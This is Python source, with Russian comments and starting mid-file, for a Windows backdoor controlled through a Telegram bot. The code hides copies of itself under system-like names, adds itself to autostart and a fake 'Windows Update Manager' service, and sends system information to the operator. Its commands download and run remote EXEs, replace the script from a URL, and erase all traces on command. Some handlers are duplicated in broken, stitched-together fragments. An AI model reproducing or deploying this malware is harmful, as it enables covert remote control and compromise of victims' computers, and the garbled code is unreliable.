    logging.info("Завершено удаление всех следов бэкдора.")
    return results

                         # Обработка команды /restart
                        elif command.startswith("/restart"):
                            logging.info("Обработка команды /restart")
                            send_text_to_telegram("<b>🔄 Перезапуск...</b>")
                            # Перезапускаем скрипт
                            current_script = os.path.abspath(sys.argv[0])
                            subprocess.Popen([sys.executable, current_script], 
                                            creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
                                # Обработка команды /persist
                        elif command.startswith("/persist"):
                            logging.info("Обработка команды /persist")
                            send_text_to_telegram("<b>🔒 Усиление персистентности...</b>")
                            results = []
                            
                            # Создаем копии в скрытых местах
                            persistent_copy = create_persistent_copy()
                            if persistent_copy:
                                results.append("✅ Копии созданы")
                            else:
                                results.append("❌ Ошибка при создании копий")
                            
                            # Добавляем в автозагрузку
                            autostart_results = add_to_autostart()
                            success_count = sum(1 for result in autostart_results.values() if result)
                            if success_count > 0:
                                results.append(f"✅ Добавлено в автозагрузку ({success_count} методов)")
                            else:
                                results.append("❌ Ошибка при добавлении в автозагрузку")
                            
                            # Создаем службу Windows
                            if create_windows_service():
                                results.append("✅ Служба Windows создана")
                            else:
                                results.append("❌ Ошибка при создании службы Windows")
                            
                            send_text_to_telegram("<b>Результаты:</b>\n" + "\n".join(results))    
                        # Обработка команды /kill
                        elif command.startswith("/kill"):
                            logging.info("Обработка команды /kill")
                            # Команда для удаления бэкдора и всех его следов
                            send_text_to_telegram("<b>🔄 Выполняется удаление бэкдора и всех следов...</b>")
                            
                            try:
                                # Удаляем все следы бэкдора
                                results = remove_all_traces()
                                
                                # Отправляем результаты удаления
                                send_text_to_telegram("<b>Результаты удаления:</b>")
                                for result in results:
                                    send_text_to_telegram(result)
                                
                                # Отправляем прощальное сообщение
                                send_text_to_telegram("<b>👋 Бэкдор удален. Завершение работы...</b>")
                                
                                # Создаем bat-файл для удаления текущего скрипта после завершения
                                try:
                                    current_script = os.path.abspath(sys.argv[0])
                                    delete_bat = os.path.join(tempfile.gettempdir(), f"cleanup_{random.randint(1000, 9999)}.bat")
                                    
                                    # Создаем bat-файл, который будет ждать завершения процесса и удалит скрипт
                                    with open(delete_bat, "w") as f:
                                        f.write(f'@echo off\n')
                                        f.write(f'timeout /t 2 /nobreak > nul\n')  # Ждем 2 секунды
                                        f.write(f'del "{current_script}"\n')  # Удаляем текущий скрипт
                                        f.write(f'del "%~f0"\n')  # Удаляем сам bat-файл
                                    
                                    # Запускаем bat-файл в скрытом режиме
                                    subprocess.Popen(
                                        ["cmd", "/c", delete_bat],
                                        shell=True,
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL,
                                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
                                    )
                                except Exception as e:
                                    logging.error(f"Ошибка при создании bat-файла для самоудаления: {e}")
                                
                                # Завершаем текущий процесс
                                os._exit(0)
                            except Exception as e:
                                error_msg = f"Ошибка при удалении бэкдора: {str(e)}"
                                logging.error(error_msg)
                                send_text_to_telegram(f"<b>❌ {error_msg}</b>")
                        # Обработка команды /help
                        elif command.startswith("/help"):
                            logging.info("Обработка команды /help")
                            help_text = f""" <b>КОМАНДЫ БЭКДОРА</b>

 <b>Доступные команды:</b>
├─ <code>/info [ID]</code> - Информация о системе
├─ <code>/download [ID] URL</code> - Загрузить и запустить EXE
├─ <code>/update [ID] URL</code> - Обновить скрипт
├─ <code>/restart [ID]</code> - Перезапустить
├─ <code>/persist [ID]</code> - Усилить персистентность
├─ <code>/kill [ID]</code> - Удалить все следы
└─ <code>/help [ID]</code> - Показать справку

 <b>ИНФОРМАЦИЯ ОБ ЭКЗЕМПЛЯРЕ</b>
├─ <b>ID:</b> <code>{instance_id}</code>
├─ <b>Имя:</b> <code>{instance_name}</code>
└─ <b>Статус:</b> ✅ Активен

💡 <b>Использование:</b>
• <code>/info</code> - информация об этом экземпляре
• <code>/info {instance_id}</code> - то же самое
• <code>/info 123</code> - команда будет проигнорирована (ID не совпадает)

📝 <b>Примеры команд:</b>
• <code>/download {instance_id} https://example.com/file.exe</code>
• <code>/update {instance_id} https://example.com/update.py</code>
• <code>/kill {instance_id}</code>"""
                            send_text_to_telegram(help_text)
                        
                        # Неизвестная команда
                        else:
                            logging.info(f"Получена неизвестная команда: {command}")
                            send_text_to_telegram("<b>❓ Неизвестная команда.</b> Используйте /help для получения списка доступных команд.")
                    
                     # Обновляем ID последнего обновления
                                
                                # Создаем bat-файл для удаления текущего скрипта после завершения
                                try:
                                    current_script = os.path.abspath(sys.argv[0])
                                    delete_bat = os.path.join(tempfile.gettempdir(), f"cleanup_{random.randint(1000, 9999)}.bat")
                                    
                                    # Создаем bat-файл, который будет ждать завершения процесса и удалит скрипт
                                    with open(delete_bat, "w") as f:
                                        f.write(f'@echo off\n')
                                        f.write(f'timeout /t 2 /nobreak > nul\n')  # Ждем 2 секунды
                                        f.write(f'del "{current_script}"\n')  # Удаляем текущий скрипт
                                        f.write(f'del "%~f0"\n')  # Удаляем сам bat-файл
                                    
                                    # Запускаем bat-файл в скрытом режиме
                                    subprocess.Popen(
                                        ["cmd", "/c", delete_bat],
                                        shell=True,
                                        stdout=subprocess.DEVNULL,
                                        stderr=subprocess.DEVNULL,
                                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS
                                    )
                                except Exception as e:
                                    logging.error(f"Ошибка при создании bat-файла для самоудаления: {e}")
                                
                                # Завершаем текущий процесс
                                os._exit(0)
                            except Exception as e:
                                error_msg = f"Ошибка при удалении бэкдора: {str(e)}"
                                logging.error(error_msg)
                                send_text_to_telegram(f"<b>❌ {error_msg}</b>")
                                               # Обработка команды /help
                        elif command.startswith("/help"):
                            logging.info("Обработка команды /help")
                            help_text = f""" <b>КОМАНДЫ БЭКДОРА</b>

 <b>Доступные команды:</b>
├─ <code>/info [ID]</code> - Информация о системе
├─ <code>/download [ID] URL</code> - Загрузить и запустить EXE
├─ <code>/update [ID] URL</code> - Обновить скрипт
├─ <code>/restart [ID]</code> - Перезапустить
├─ <code>/persist [ID]</code> - Усилить персистентность
├─ <code>/kill [ID]</code> - Удалить все следы
└─ <code>/help [ID]</code> - Показать справку

 <b>ИНФОРМАЦИЯ ОБ ЭКЗЕМПЛЯРЕ</b>
├─ <b>ID:</b> <code>{instance_id}</code>
├─ <b>Имя:</b> <code>{instance_name}</code>
└─ <b>Статус:</b> ✅ Активен

💡 <b>Использование:</b>
• <code>/info</code> - информация об этом экземпляре
• <code>/info {instance_id}</code> - то же самое
• <code>/info 123</code> - команда будет проигнорирована (ID не совпадает)

📝 <b>Примеры команд:</b>
• <code>/download {instance_id} https://example.com/file.exe</code>
• <code>/update {instance_id} https://example.com/update.py</code>
• <code>/kill {instance_id}</code>"""
                            send_text_to_telegram(help_text)
                        
                        # Неизвестная команда
                        else:
                            logging.info(f"Получена неизвестная команда: {command}")
                            send_text_to_telegram("<b>❓ Неизвестная команда.</b> Используйте /help для получения списка доступных команд.")
                    
                     # Обновляем ID последнего обновления                   if "update_id" in update:
                        last_update_id = update["update_id"]
                        
                except Exception as e:
                    logging.error(f"Ошибка при обработке обновления: {e}")
        
        except requests.exceptions.RequestException as e:
            logging.error(f"Ошибка сети при получении обновлений: {e}")
            time.sleep(reconnect_delay)
            reconnect_delay = min(reconnect_delay * 1.5, max_reconnect_delay)
        except Exception as e:
            logging.error(f"Непредвиденная ошибка в main_listener: {e}")
            time.sleep(reconnect_delay)
        
        time.sleep(2)

# Функция для проверки интернет-соединения
def check_internet_connection(timeout: int = INTERNET_CHECK_TIMEOUT) -> bool:
    """Проверяет наличие интернет-соединения, пытаясь подключиться к нескольким хостам.
    
    Args:
        timeout (int, optional): Таймаут для проверки в секундах. По умолчанию INTERNET_CHECK_TIMEOUT.
        
    Returns:
        bool: True если есть соединение, иначе False
    """
    try:
        # Пробуем подключиться к надежным серверам
        hosts = ["8.8.8.8", "1.1.1.1", "google.com", "microsoft.com", "cloudflare.com"]
        random.shuffle(hosts)  # Перемешиваем список для непредсказуемости
        
        for host in hosts:
            try:
                logging.debug(f"Проверка интернет-соединения через {host}")
                socket.create_connection((host, 80), timeout=timeout)
                logging.info(f"Интернет-соединение доступно (проверено через {host})")
                return True
            except socket.error as e:
                logging.debug(f"Не удалось подключиться к {host}: {e}")
                continue
            except Exception as e:
                logging.debug(f"Неизвестная ошибка при проверке {host}: {e}")
                continue
        
        logging.warning("Интернет-соединение недоступно")
        return False
    except Exception as e:
        logging.error(f"Критическая ошибка при проверке интернет-соединения: {e}")
        return False

# Функция для создания копии скрипта в скрытом месте
def create_persistent_copy() -> Optional[str]:
    """Создает копии скрипта в скрытых местах для обеспечения персистентности.
    
    Returns:
        Optional[str]: Путь к первой успешно созданной копии или None в случае ошибки
    """
    logging.info("Создание копий скрипта в скрытых местах")
    
    try:
        # Получаем путь к текущему скрипту
        current_script = os.path.abspath(sys.argv[0])
        
        # Создаем скрытые папки в разных местах для надежности
        hidden_locations = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "SystemServices"),
            os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Windows", "SystemServices"),
            os.path.join(os.environ["TEMP"], "WindowsServices"),
            os.path.join(os.environ.get("USERPROFILE", ""), "Documents", "WindowsServices")
        ]
        
        hidden_scripts = []
        
        for hidden_dir in hidden_locations:
            try:
                logging.debug(f"Создание директории: {hidden_dir}")
                os.makedirs(hidden_dir, exist_ok=True)
                
                # Делаем папку скрытой
                if platform.system() == 'Windows':
                    try:
                        subprocess.run(
                            ["attrib", "+h", hidden_dir],
                            shell=True,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        logging.debug(f"Директория скрыта: {hidden_dir}")
                    except Exception as e:
                        logging.error(f"Ошибка при скрытии директории {hidden_dir}: {e}")
                
                # Копируем скрипт в скрытую папку с разными именами
                filenames = ["winupdate.py", "svchost.py", "winsvc.py", f"system_{random.randint(1000, 9999)}.py"]
                for filename in filenames:
                    hidden_script = os.path.join(hidden_dir, filename)
                    try:
                        if not os.path.exists(hidden_script) or os.path.getmtime(current_script) > os.path.getmtime(hidden_script):
                            shutil.copy2(current_script, hidden_script)
                            logging.info(f"Создана копия: {hidden_script}")
                        hidden_scripts.append(hidden_script)
                    except Exception as e:
                        logging.error(f"Ошибка при копировании в {hidden_script}: {e}")
            except Exception as e:
                logging.error(f"Ошибка при создании директории {hidden_dir}: {e}")
                continue
        
        # Возвращаем первый успешно созданный скрипт или None
        if hidden_scripts:
            logging.info(f"Успешно создано {len(hidden_scripts)} копий")
            return hidden_scripts[0]
        else:
            logging.warning("Не удалось создать ни одной копии")
            return None
    except Exception as e:
        logging.error(f"Критическая ошибка при создании копий: {e}")
        return None

# Функция для самообновления скрипта
def self_update(update_url=None):
    if not update_url:
        return False
        
    try:
        # Скачиваем обновленную версию
        temp_file = os.path.join(tempfile.gettempdir(), f"update_{random.randint(1000, 9999)}.py")
        urllib.request.urlretrieve(update_url, temp_file)
        
        # Проверяем, что файл действительно является Python-скриптом
        with open(temp_file, 'r') as f:
            content = f.read(100)  # Читаем первые 100 символов
            if not content.strip().startswith("import") and not content.strip().startswith("#"):
                os.remove(temp_file)
                return False
        
        # Получаем путь к текущему скрипту
        current_script = os.path.abspath(sys.argv[0])
        
        # Копируем обновленную версию на место текущего скрипта
        shutil.copy2(temp_file, current_script)
        
        # Обновляем все копии
        hidden_copies = create_persistent_copy()
        
        # Удаляем временный файл
        try:
            os.remove(temp_file)
        except:
            pass
            
        # Перезапускаем скрипт
        subprocess.Popen([sys.executable, current_script], 
                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP | subprocess.DETACHED_PROCESS)
        
        # Завершаем текущий процесс
        os._exit(0)
        
        return True
    except Exception:
        return False

# Функция для создания службы Windows (требует прав администратора)
def create_windows_service():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        return False
    
    try:
        script_path = create_persistent_copy() or os.path.abspath(sys.argv[0])
        service_name = "WindowsUpdateManager"
        
        # Создаем .bat файл для службы
        service_bat = os.path.join(tempfile.gettempdir(), "service_installer.bat")
        with open(service_bat, "w") as f:
            f.write(f'@echo off\n')
            f.write(f'sc create {service_name} binPath= "\"pythonw.exe\" \"{script_path}\"" start= auto DisplayName= "Windows Update Manager"\n')
            f.write(f'sc description {service_name} "Manages critical Windows updates and system services"\n')
            f.write(f'sc start {service_name}\n')
        
        # Запускаем .bat файл с правами администратора
        subprocess.run(
            ["cmd", "/c", service_bat],
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        
        # Удаляем временный файл
        try:
            os.remove(service_bat)
        except:
            pass
            
        return True
    except Exception:
        return False

# Функция для удаления всех следов бэкдора
def remove_all_traces() -> List[str]:
    """Удаляет все следы бэкдора из системы.
    
    Returns:
        List[str]: Список результатов удаления
    """
    logging.info("Начало удаления всех следов бэкдора")
    results = []
    
    # Удаляем копии из скрытых мест
    logging.info("Удаление скрытых копий")
    try:
        hidden_locations = [
            os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "SystemServices"),
            os.path.join(os.environ["LOCALAPPDATA"], "Microsoft", "Windows", "SystemServices"),
            os.path.join(os.environ["TEMP"], "WindowsServices"),
            os.path.join(os.environ.get("USERPROFILE", ""), "Documents", "WindowsServices")
        ]
        
        removed_files = 0
        removed_dirs = 0
        
        for hidden_dir in hidden_locations:
            if os.path.exists(hidden_dir):
                filenames = ["winupdate.py", "svchost.py", "winsvc.py", "system_*.py"]
                for filename in filenames:
                    # Поддержка шаблонов с звездочкой
                    if "*" in filename:
                        pattern = filename.replace("*", "\d{4}")
                        for file in os.listdir(hidden_dir):
                            if re.match(pattern, file):
                                try:
                                    hidden_script = os.path.join(hidden_dir, file)
                                    os.remove(hidden_script)
                                    removed_files += 1
                                    logging.info(f"Удален файл: {hidden_script}")
                                except Exception as e:
                                    logging.error(f"Ошибка при удалении файла {file}: {e}")
                    else:
                        hidden_script = os.path.join(hidden_dir, filename)
                        if os.path.exists(hidden_script):
                            try:
                                os.remove(hidden_script)
                                removed_files += 1
                                logging.info(f"Удален файл: {hidden_script}")
                            except Exception as e:
                                logging.error(f"Ошибка при удалении файла {hidden_script}: {e}")
                
                # Пытаемся удалить директорию
                try:
                    shutil.rmtree(hidden_dir)
                    removed_dirs += 1
                    logging.info(f"Удалена директория: {hidden_dir}")
                except Exception as e:
                    logging.error(f"Ошибка при удалении директории {hidden_dir}: {e}")
        
        results.append(f"✅ Копии удалены (файлов: {removed_files}, директорий: {removed_dirs})")
    except Exception as e:
        error_msg = f"❌ Ошибка при удалении копий: {str(e)}"
        logging.error(error_msg)
        results.append(error_msg)
    
    # Удаляем из автозагрузки
    logging.info("Удаление из автозагрузки")
    try:
        # Удаляем из реестра HKCU\Run
        try:
            key_names = ["SystemService", "WindowsSystemService"]
            for key_name in key_names:
                try:
                    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                    winreg.DeleteValue(key, key_name)
                    winreg.CloseKey(key)
                    logging.info(f"Удалено из HKCU\Run: {key_name}")
                except Exception as e:
                    logging.debug(f"Не удалось удалить {key_name} из HKCU\Run: {e}")
        except Exception as e:
            logging.error(f"Ошибка при удалении из HKCU\Run: {e}")
        
        # Удаляем из реестра HKLM\Run
        if ctypes.windll.shell32.IsUserAnAdmin():
            try:
                key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsSystemService")
                winreg.CloseKey(key)
                logging.info("Удалено из HKLM\Run: WindowsSystemService")
            except Exception as e:
                logging.error(f"Ошибка при удалении из HKLM\Run: {e}")
        
        # Удаляем .bat файлы из папки автозагрузки
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft\Windows\Start Menu\Programs\Startup")
        bat_patterns = ["system_service*.bat", "Windows*.bat"]
        removed_bats = 0
        
        for pattern in bat_patterns:
            try:
                for bat_file in glob.glob(os.path.join(startup_folder, pattern)):
                    try:
                        os.remove(bat_file)
                        removed_bats += 1
                        logging.info(f"Удален файл из автозагрузки: {bat_file}")
                    except Exception as e:
                        logging.error(f"Ошибка при удалении файла {bat_file}: {e}")
            except Exception as e:
                logging.error(f"Ошибка при поиске файлов по шаблону {pattern}: {e}")
        
        # Удаляем задачи из планировщика
        if ctypes.windll.shell32.IsUserAnAdmin():
            task_name = "WindowsSystemUpdate"
            try:
                subprocess.run(
                    ["schtasks", "/delete", "/tn", task_name, "/f"],
                    shell=True,
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                logging.info(f"Удалена задача из планировщика: {task_name}")
            except Exception as e:
                logging.error(f"Ошибка при удалении задачи {task_name}: {e}")
        
        results.append(f"✅ Удалено из автозагрузки (bat-файлов: {removed_bats})")
    except Exception as e:
        error_msg = f"❌ Ошибка при удалении из автозагрузки: {str(e)}"
        logging.error(error_msg)
        results.append(error_msg)
    
    # Удаляем службу Windows
    logging.info("Удаление службы Windows")
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            service_names = [SERVICE_NAME, "WindowsUpdateManager"]
            for service_name in service_names:
                try:
                    subprocess.run(
                        ["sc", "stop", service_name],
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    subprocess.run(
                        ["sc", "delete", service_name],
                        shell=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL
                    )
                    logging.info(f"Удалена служба Windows: {service_name}")
                except Exception as e:
                    logging.error(f"Ошибка при удалении службы {service_name}: {e}")
            results.append("✅ Службы Windows удалены")
        else:
            results.append("⚠️ Нет прав для удаления службы Windows")
    except Exception as e:
        error_msg = f"❌ Ошибка при удалении службы Windows: {str(e)}"
        logging.error(error_msg)
        results.append(error_msg)
    
    # Удаляем файл-маркер
    logging.info("Удаление файла-маркера")
    try:
        marker_files = [
            MARKER_FILE,
            os.path.join(tempfile.gettempdir(), "winsys_marker.dat")
        ]
        
        for marker_file in marker_files:
            if os.path.exists(marker_file):
                try:
                    os.remove(marker_file)
                    logging.info(f"Удален файл-маркер: {marker_file}")
                except Exception as e:
                    logging.error(f"Ошибка при удалении файла-маркера {marker_file}: {e}")
        
        results.append("✅ Файлы-маркеры удалены")
    except Exception as e:
        error_msg = f"❌ Ошибка при удалении файлов-маркеров: {str(e)}"
        logging.error(error_msg)
        results.append(error_msg)
    
    # Удаляем лог-файл
    logging.info("Удаление лог-файла")
    try:
        if os.path.exists(log_file):
            # Закрываем все хендлеры логирования
            for handler in logging.root.handlers[:]:  
                handler.close()
                logging.root.removeHandler(handler)
                
            # Удаляем файл лога
            os.remove(log_file)
            results.append("✅ Лог-файл удален")
    except Exception as e:
        error_msg = f"❌ Ошибка при удалении лог-файла: {str(e)}"
        results.append(error_msg)
    
    logging.info("Завершено удаление всех следов бэкдора")
    return results

# Функция для проверки и перезапуска процесса
def setup_watchdog():
    # Создаем файл-маркер для отслеживания активности
    marker_file = os.path.join(tempfile.gettempdir(), "winsys_marker.dat")
    
    # Записываем текущее время в файл-маркер
    try:
        with open(marker_file, "w") as f:
            f.write(str(datetime.now().timestamp()))
    except Exception:
        pass
    
    # Запускаем поток для проверки маркера
    def watchdog_thread():
        while True:
            time.sleep(300)  # Проверяем каждые 5 минут
            try:
                with open(marker_file, "r+") as f:
                    last_time = float(f.read().strip())
                    current_time = datetime.now().timestamp()
                    # Обновляем маркер
                    f.seek(0)
                    f.write(str(current_time))
                    f.truncate()
            except Exception:
                pass
    
    # Запускаем поток watchdog
    watchdog = threading.Thread(target=watchdog_thread, daemon=True)
    watchdog.start()

# Главная функция
def main():
    # Добавляем в автозагрузку
    add_to_autostart()
    
    # Создаем копию в скрытом месте
    create_persistent_copy()
    
    # Пытаемся создать службу Windows
    create_windows_service()
    
    # Настраиваем watchdog для перезапуска
    setup_watchdog()
    
    # Отправляем сообщение о запуске без явного указания, что это бэкдор
    info = get_system_info()
    send_text_to_telegram("🔄 Сервис запущен\n" + json.dumps(info, indent=4, ensure_ascii=False))
    
    # Запускаем прослушивание в отдельном потоке
    listener_thread = threading.Thread(target=main_listener, daemon=True)
    listener_thread.start()
    
    # Держим основной поток активным
    try:
        while True:
            time.sleep(60)
            # Обновляем файл-маркер
            marker_file = os.path.join(tempfile.gettempdir(), "winsys_marker.dat")
            try:
                with open(marker_file, "w") as f:
                    f.write(str(datetime.now().timestamp()))
            except Exception:
                pass
    except KeyboardInterrupt:
        pass

# Точка входа
if __name__ == "__main__":
    main()
